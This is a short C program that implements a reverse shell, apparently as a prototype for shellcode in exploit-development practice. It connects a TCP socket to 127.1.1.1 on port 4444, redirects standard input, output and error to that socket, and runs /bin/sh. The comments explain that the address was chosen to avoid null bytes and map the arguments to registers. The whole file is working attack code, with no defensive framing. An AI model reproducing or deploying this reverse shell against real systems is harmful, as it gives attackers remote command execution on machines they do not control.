#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

/*
int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
*/

/*
struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET
    unsigned short   sin_port;     // e.g. htons(4444)
    struct in_addr   sin_addr; 
    char             sin_zero[8]; 
};


struct in_addr {
    unsigned long s_addr;  	   // inet_addr("127.1.1.1")
};

*/

int main()
{
	// AF_INET uses IPv4 protocol, and 0 stands for default protocol
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	// defines target address:
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);
	// we dont use 127.0.0.1 to avoid null bytes:
	addr.sin_addr.s_addr = inet_addr("127.1.1.1");
	
	// connect to target:
	connect(sock, (struct sockaddr *) &addr, sizeof(addr));
	
	// redirect standard input, output and error to the socket sock:
	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	execve("/bin/sh", NULL, NULL);
	// RAX    EBX      ECX   EDX

	return 0;
}
